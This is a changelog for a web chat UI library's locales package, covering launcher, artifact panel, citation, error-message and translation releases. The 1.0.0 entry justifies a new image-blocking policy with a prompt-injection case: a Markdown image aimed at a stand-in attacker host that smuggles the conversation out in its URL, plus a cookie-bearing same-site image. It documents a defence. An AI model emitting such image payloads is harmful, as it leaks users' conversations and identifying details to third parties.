# @aparte/locales

## 1.3.0

### Minor Changes

- a324788: `<aparte-launcher>` now draws a header over its card: the assistant's avatar, a title, a ✕ that closes the chat, and with `maximizable` a button that maximizes the chat. `header="false"` removes it.

  A card that brings its own header keeps it and gets none: a `<header>` at the card's top level. If your card has a header written another way, set `header="false"`.

  ```html
  <aparte-launcher
    label="Help"
    heading="Kilnhouse support"
    subheading="Usually answers in a minute"
    maximizable
  >
    <aparte-chat></aparte-chat>
  </aparte-launcher>
  ```

  - `heading` is the title (unset: the button's `label`, else the locale's `launcherHeading`, "Chat"; empty: no title), `subheading` a line under it. The avatar is the assistant's, drawn by the config's avatar provider as in the messages (`setAvatarProvider`); there is none without a provider.
  - `maximizable` adds the button beside the ✕. Maximized, the chat fills the window on any screen — the sheet a phone already gets: the header on top, Tab kept inside — and the same button brings the card back. `maximizable="panel"` keeps the page in view instead: a panel the window's height along the inline-end edge (the right, on a left-to-right page), `--aparte-launcher-panel-width` (36rem) wide. Escape brings a maximized chat back before a second Escape closes it. The state is `maximized`, an attribute the element reflects and a property, and `maximize()` / `restore()` set it from a script, as `show()` / `close()` do for `open`. Under the breakpoint the sheet hides every maximize control: it already fills the window.
  - `covers` (a property, and a field of the `aparte-launcher-toggle` detail beside the new `maximized`) says when the open chat covers the whole window — a sheet, or maximized to the window (a panel as wide as the window counts); set your page `inert` from it.
  - In a header of your own, mark a button `data-aparte-launcher-maximize`: it toggles the same state, and the launcher keeps its `aria-pressed`. The sanitizer refuses the attribute in model markup, as it does `data-aparte-launcher-close`.
  - `--aparte-launcher-height` now includes the header. The header is at least `--aparte-launcher-header-height` (3.5rem) and grows with what it holds; the card under it takes the rest.
  - New icons `maximize` and `minimize`, and three locale keys in every language: `launcherHeading`, `launcherMaximize` ("Expand the chat") and `launcherRestore` ("Shrink the chat").
  - `<AparteUi>`, in every wrapper, now turns a boolean that is ON by default OFF with the string `"false"` when its prop is `false`: `header` here, and the composer's `submit-on-enter` and the attachment picker's `multiple`, which `false` used to turn ON by removing the attribute. In JSX, write `header="false"`: the generated types already ask for it.

  The header wears the Header recipe. One rule puts it in a brand's colours, its buttons included:

  ```css
  aparte-launcher .aparte-launcher__header {
    background: #1d6fe0;
    border-color: #1d6fe0;
    color: #fff;
  }
  ```

## 1.2.0

### Minor Changes

- fd00133: New `<aparte-artifact-panel>`: a conversation's document beside the chat, with its versions. Import it from `@aparte/plugin-artifacts/panel`.

  ```html
  <aparte-split position="40" single>
    <aparte-chat id="chat">…</aparte-chat>
    <aparte-artifact-panel for="chat"></aparte-artifact-panel>
  </aparte-split>
  ```

  ```ts
  import { setupArtifacts } from "@aparte/plugin-artifacts";
  import { connectArtifactPanel } from "@aparte/plugin-artifacts/panel";

  setupArtifacts();
  connectArtifactPanel({ chat, panel, split });
  ```

  `connectArtifactPanel` turns on the card's Open button for that chat: a press shows that version in the panel, opens the split's pane and moves the focus to the title; Close, or Escape, folds the pane and gives the focus back. `autoOpen: true` opens the pane when a turn writes a document. The split is optional (`onOpen`, `onClose` for a dialog or a drawer).

  The panel reads the conversation and keeps nothing of its own. One header row holds the title, the version arrows, your own buttons (a child with `slot="actions"`), the card's Code and Preview tabs, Copy, Download and Close. A Markdown document is shown rendered, for reading; a page or a component is shown as source and runs only on a press, as on the card. It also takes your own documents (`documents`), an agent's own tool (`read`) and your own rendering of one kind (`render`). It is a separate entry, so an app that only wants the card does not ship it.

  Four locale keys come with it, translated in the nine languages of `@aparte/locales`: `closeArtifact`, `artifactVersion`, `previousVersion`, `nextVersion`.

## 1.1.2

## 1.1.1

## 1.1.0

### Minor Changes

- c980d67: Add `setBubbleActions({ feedbackReasons: ['Not accurate', 'Too long'] })`: a thumbs-down then asks why.

  One press sends the new `aparte-feedback-reason` event with the message id and the reason. `aparte-feedback` still goes out on the thumb itself, as before. New locale keys: `feedbackReasonTitle`, `feedbackReasonDismiss`.

- 2753047: Add `aparteGlobalConfig.setTurnSummary()`: reasoning and consecutive tool calls fold behind one line. Off by default, and with it off the DOM does not change.

  While the steps run the line says `Working…` and names the current tool; afterwards it says `Worked 9 s · 7 tools`, or `Used 7 tools` on a stored turn that carries no timing. `setTurnSummary({ openWhileRunning: true })` keeps the fold open while it works, and never closes one somebody opened.

  A call waiting for approval, a call that failed and a tool with its own `registerToolRenderer` stay outside the fold, since those are what somebody has to read. A `hidden` tool is neither counted nor breaks the run, and a single step is never folded.

  New locale keys, added in all nine bundles: `turnWorking`, `turnWorked`, `turnUsed`, `turnTools`. `turnTools` is a plural form string by `Intl.PluralRules` category (`one:{n} tool|other:{n} tools`).

## 1.0.2

## 1.0.1

## 1.0.0

### Major Changes

- 224afde: Everything marked deprecated is removed. If your code uses none of the names below, nothing changes; otherwise replace each one as its line says.

  - `<aparte-context auto-compact>`, deprecated in 0.26.0: remove the attribute. The gauge no longer asks for a compaction; `@aparte/plugin-compaction` compacts by itself once it is set up (past 80 % of the window by default).
  - The `compactionSummaryTitle` locale key, deprecated in 0.26.0: remove it from your locale. Nothing has read it since 0.26.0, and the nine locales of `@aparte/locales` no longer carry it.
  - The `window` field of an `aparte-compact` request's detail, read "for one more release" since 0.26.0: give `setupCompaction` a `contextWindow` instead, or let the model declare its window.
  - The viewport's `clearMessages()`, deprecated since 0.4.0: call `clearAll()`, which also removes the bubbles. `clearMessages()` on `<aparte-chat>`, on the framework components and on the imperative API is unchanged.
  - `AparteMessageBranch` and the `branches` / `activeBranchIndex` fields of `AparteMessage`, deprecated since 0.4.0 and read by nothing: branches are the message tree (`addSiblingOf`, `navigateBranch`, `aparte-path-changed`).
  - `AparteCodeSegment.showLineNumbers` and `AparteErrorSegment.stack`, deprecated in 0.19.3 and read by nothing: put a stack in `details`.

### Minor Changes

- 67efebe: A picture a model or a tool chose no longer loads by itself: `data:` and `blob:` pictures do, and any other shows as a link naming its host until the reader clicks it. To load your own, call `aparteGlobalConfig.setImagePolicy(['self', 'https://cdn.example.com'])`; `['*']` loads every picture, as before.

  - **Why.** A picture fetches its address the moment it is shown, before anyone reads the reply, and a prompt-injected model can write the conversation into that address: `![](https://attacker.example/c.png?d=…)` sent it, the reader's IP and their browser to that host with no click — while the reply streamed, and again each time the conversation was shown. The page's own site is not trusted by default either: its pictures carry the reader's cookies (`![](/api/logout)`), and an open redirect on it turns a picture from the site into a picture from anywhere.
  - **In a reply.** A held picture is a small link that says where it would load from (inside a link of the reply's own, a button, so that link stays whole). A click loads it in place, and the chat remembers the choice; a click with a modifier key is left to the browser, as for any link. `config.sanitizeHtml` applies the policy after whichever sanitizer is set, so DOMPurify or your own keeps it, and `@aparte/plugin-streaming-markdown` applies it before any `src` is set, so nothing is fetched while a reply streams. A picture's own address decides; of its `srcset`, only the candidates that load are kept, written again so a browser can only pick an address that was judged.
  - **In a card.** `@aparte/plugin-cards` draws a card without the pictures the policy held, and one "Show images" button with every host they would load from beside it; pressing it draws them. A card of your own asks through `ctx.image(src, props)` and `ctx.loads(url)`.
  - **The rule.** `setImagePolicy` takes a list (`'self'`, `'*'`, origins) or a function `(url) => 'load' | 'hold' | 'drop'`. `config.decideImage(url)` answers for a plugin that draws pictures itself, and `config.showImage(url)` records the reader's choice. Every picture that loads goes with `referrerpolicy="no-referrer"`. A CSP `img-src` is the stronger rule beside it: it also checks where a redirect leads.
  - Two locale keys, `imageLoad` and `imageLoadNamed`, name a held picture; `@aparte/locales` carries them in its nine languages.
  - **The console says why.** Until the app names a policy, the first picture held on a page writes one note in the console, with its host and the line to add; `setImagePolicy([])` keeps the default and silences it.

### Patch Changes

- Updated dependencies [26ddd6c]
- Updated dependencies [e97d464]
- Updated dependencies [0a6dd91]
- Updated dependencies [635f69b]
- Updated dependencies [224afde]
- Updated dependencies [2e5c5ab]
- Updated dependencies [67efebe]
- Updated dependencies [99fcc42]
- Updated dependencies [e97d464]
- Updated dependencies [048864d]
- Updated dependencies [99784ad]
  - @aparte/core@1.0.0

## 0.32.1

## 0.32.0

## 0.31.0

## 0.30.1

## 0.30.0

## 0.29.4

## 0.29.3

## 0.29.2

## 0.29.1

## 0.29.0

## 0.28.3

## 0.28.2

## 0.28.1

## 0.28.0

### Minor Changes

- 5839913: A reply now shows the sources it cites: a chip at the end of each cited passage, a card it opens, and the list of sources under the reply. Providers send them with a new `sources` stream event; a text segment carries them in two new fields, `sources` and `citations`.

  A chip shows the source's domain, and `+2` when two more back the same passage; it sits after the passage's punctuation, after the bold, link or code the passage ends in, and takes the place of a `[1]` marker the model wrote. A passage that cannot be found again gets no chip, only its place in the list. It is a button whose label is drawn from `data-label`, so copying the passage copies its words only: its card, shown in the top layer, shows the title as a link, the domain and an excerpt, pages through several sources, and closes on Escape or Tab back to the chip. The bubble lists the reply's sources under its segments, in a closed `<details>`. Nothing changes for a reply that cites nothing, and the sources are never sent back to the model.

  The `sources` event's offsets are into the text the model call streamed; the stream adapter rebases each citation onto the text segment it falls in. The engine now emits `turn-start` before a non-streamed string answer too, as it does before a streamed call, so nothing of the call before it carries over. A non-streamed answer carries them too: a format adapter's optional `parseSources(json)`, and the backend handler adds `sources` and `citations` to its JSON. A chip is placed by text in the rendered Markdown, so the same under every Markdown provider; `renderCitations(contentEl, segment)` places them for a renderer of one's own. Seven locale keys (`sourcesCount`, `sourcesOne`, `sourcesCard`, `sourcePrevious`, `sourceNext`, `sourcePosition`, `opensInNewTab`), translated in the nine `@aparte/locales` bundles. No favicon is fetched.

## 0.27.4

## 0.27.3

## 0.27.2

## 0.27.1

## 0.27.0

### Minor Changes

- 5e31fa9: A failed turn now shows a plain sentence chosen by the error's code, in the reader's language, instead of the transport's or the provider's raw message. The raw message goes to the browser's console and stays on the error segment; `setErrorRenderer` still receives it as `message`, and now also the `sentence`.

  Seven locale keys hold the sentences, and every language of `@aparte/locales` translates them: `errorUnreachable` (NET_OFFLINE, NET_ERROR), `errorTimeout` (NET_TIMEOUT), `errorRefused` (CONFIG_INVALID_KEY, a 401 or a 403), `errorRateLimited` (USAGE_RATE_LIMIT), `errorTooLong` (USAGE_CONTEXT_EXCEEDED), `errorFailed` (PROVIDER_ERROR, PROVIDER_UNAVAILABLE) and `errorNoAnswer` (USAGE_BAD_REQUEST, PROVIDER_POLICY, PROVIDER_MISCONFIGURED, CONFIG_INVALID_MODEL, UNKNOWN_ERROR). The new code `PROVIDER_MISCONFIGURED` names a provider reached but set up so it cannot answer; `@aparte/runner-n8n` raises it for a workflow that is not published, waits for credentials, streams nothing, answers without a text field or answers through response nodes. "Try again in a moment" is said only where a moment can help. `extendLocale` changes them.

  A tool whose handler throws now ends the turn as UNKNOWN_ERROR, whatever it threw: its own failed fetch or 401 no longer reads as the assistant being unreachable or the provider refusing the key.

  An error keeps its own words when they were written for the reader or the developer already: the turn limit (MAX_TURNS_EXCEEDED, localized when it is raised), the two setup errors core raises before any request (CONFIG_NO_PROVIDER, CONFIG_MISSING_KEY), and an error segment an app or a plugin adds with a code of its own or none. A custom error renderer's card is left alone on a language switch.

- 5e31fa9: Add `<aparte-launcher>`: put your chat inside it and it floats as a button in the bottom corner of the window, opening the chat as a card above it, and as a full-window sheet on a phone.

  ```html
  <aparte-launcher label="Help">
    <aparte-chat></aparte-chat>
  </aparte-launcher>
  ```

  The button is the button recipe (solid, primary, large): round with a speech bubble, or a pill when you give it a `label`. A click opens the chat, and a second click, Escape, or any control of yours marked `data-aparte-launcher-close` closes it. Opening with the button hands the focus to the composer; `show()` and `open` set from a script move no focus, so a page that restores the saved state on load does not steal it. Closing gives the focus back to the button when it was inside. A closed launcher keeps the chat mounted, so the conversation and the client stay, but out of sight, out of the tab order and out of the accessibility tree — whatever `display` your card sets, inline or by a rule. `open`, `show()`, `close()` and `toggle()` drive it from a script, and `aparte-launcher-toggle` reports every change — including, while the chat is open, the window crossing the breakpoint, so a host that takes its page out of reach under the sheet needs no media query of its own.

  Escape closes the launcher unless something inside has the key first: a control that answered it (a menu closing, the context gauge's panel), an input method that is composing, or a modal dialog open in your card, which closes itself on it. The next Escape closes the launcher.

  Under `breakpoint` (30rem of window in width or in height unless you set a width, `none` for a card at any size) the open chat fills the window, Tab stays inside it, and the button moves to the top corner — or hides, when your card holds its own close control. The size, the offset from the edges, the gap and the corners are `--aparte-launcher-width`, `-height`, `-offset`, `-gap` and `-radius`.

  The locale gains `launcherOpen` and `launcherClose`, the button's accessible name when it shows no text, translated in the nine languages of `@aparte/locales`. The icon provider gains `messageSquare`, the closed button's glyph, and the button asks for `launcherOpen` and `launcherClose` first, so a theme redraws the button alone (`registerIcons`) without redrawing every close button in the chat. The button reads them from the chat inside it when that chat carries its own config (a wrapper's `config` prop, `attachConfig`), and from the page's config otherwise, so a French chat gets a French button without a global setting.

  On a server-rendered page, hold the launcher with `defer-hydration` — on it, or on an element around it — and release it with `releaseDeferredHydration` once your framework has hydrated, as the launcher page shows. The launcher draws its button when it connects, and hydration removes what it did not render; if something removes the button anyway, the element puts it back.

  The context gauge now answers an Escape pressed inside it on its own element, and stops and default-prevents it: an element around a gauge that listens for Escape no longer sees that press, which is what lets a launcher or a dialog around it stay open under the panel. An Escape from elsewhere still closes the panel and is left to whatever else listens for it.

  The docs' Support widget template is now built on it, in place of the launcher it drew by hand.

- 5e31fa9: `@aparte/locale-fr` is removed: import `fr` from `@aparte/locales/fr` instead, the same strings. The new package also translates the chat into Spanish, Portuguese (Brazil), German, Italian, Russian, Japanese, Korean and Chinese (Simplified).

  ```diff
  - import { fr } from '@aparte/locale-fr';
  + import { fr } from '@aparte/locales/fr';
  ```

  This removal skips the notice release the stability page promises for a frozen name: `@aparte/locale-fr` leaves in this release, without a release that only deprecates it. Its last version, 0.26.0, stays installable on npm and gets no further release; it lacks the strings 0.27.0 adds (the error sentences, the launcher's names), which a French chat that keeps it shows in English.

  Each language is its own entry (`@aparte/locales/es`, `@aparte/locales/pt-BR`, `@aparte/locales/zh-CN`…), so a page loads only the one it imports; all nine are also named exports of the package root (`fr`, `es`, `ptBR`, `de`, `it`, `ru`, `ja`, `ko`, `zhCN`). Every one translates every string core draws, keeps English's placeholders in the same keys, sets a `tag` that `Intl` formats dates and numbers in, and is written left to right.

  `check:locale-keys` holds every language of the package to core's list, as it held French: a key core adds and a language leaves out fails the gate instead of showing in English on a translated page.

  The eight new languages were translated for this release and have not yet been reviewed by native speakers; corrections are welcome as issues or pull requests.
